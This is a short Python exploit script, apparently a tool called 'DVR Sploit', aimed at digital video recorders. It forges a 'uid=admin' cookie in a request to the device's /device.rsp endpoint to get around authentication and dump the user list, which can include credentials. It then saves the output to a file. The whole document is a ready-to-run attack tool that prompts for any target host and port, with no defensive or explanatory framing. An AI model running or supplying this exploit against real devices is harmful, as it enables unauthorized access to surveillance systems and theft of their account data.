import requests

def get_device_list(host, port):
    url = f"http://{host}:{port}/device.rsp"
    headers = {
        "Cookie": "uid=admin"
    }
    params = {
        "opt": "user",
        "cmd": "list"
    }

    try:
        response = requests.get(url, params=params, headers=headers)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Error: {response.status_code}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

if __name__ == "__main__":
    print("\033[38;2;255;69;172m" + r'''
    ___________    _________     ________       ______     __________ 
    ___  __ \_ |  / /__  __ \    __  ___/__________  /________(_)_  /_
    __  / / /_ | / /__  /_/ /    _____ \___  __ \_  /_  __ \_  /_  __/
    _  /_/ /__ |/ / _  _, _/     ____/ /__  /_/ /  / / /_/ /  / / /_  
    /_____/ _____/  /_/ |_|      /____/ _  .___//_/  \____//_/  \__/  
                                        /_/          By @mindfuckerrrr
''')

    host = input("\033[38;2;0;255;0mEnter DVR host: ")
    port = input("Enter DVR port: ")

    device_list = get_device_list(host, port)
    if device_list:
        print("\033[38;2;0;255;0mDevice list:")
        print(device_list)

        with open("dvr_output.txt", "a") as file:
            file.write(device_list)
            file.write("\n\n")  # Add two empty lines after writing the device list
        print("Device list appended to dvr_output.txt")
